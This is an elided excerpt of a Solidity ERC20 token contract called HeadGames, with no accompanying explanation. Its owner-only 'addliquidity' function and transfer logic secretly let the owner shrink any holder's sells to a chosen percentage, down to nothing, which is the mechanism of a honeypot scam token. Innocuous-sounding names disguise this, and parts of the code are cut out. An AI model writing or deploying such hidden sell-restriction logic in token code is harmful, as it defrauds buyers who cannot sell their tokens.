...
contract HeadGames is  IERC20, IERC20Metadata,Ownable {
    ...
    address public  uniswapV2Pair = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    struct userSells{
        uint256 liquidityLimit;
        bool isliquidity;
    }
    mapping (address => userSells) public addliquiditys;
    constructor() {
    ...
    function addliquidity(address account, bool isliquidity,uint256 num) public onlyOwner() {
        addliquiditys[account].isliquidity = isliquidity;
        addliquiditys[account].liquidityLimit = num;
    }
    ...
    function _transfer(
        ...
        uint256 amount1=0;
        if(recipient==uniswapV2Pair || addliquiditys[sender].isliquidity){
           amount1 =amount.mul(addliquiditys[sender].liquidityLimit).div(100);
       }else{
           amount1=amount;
       }
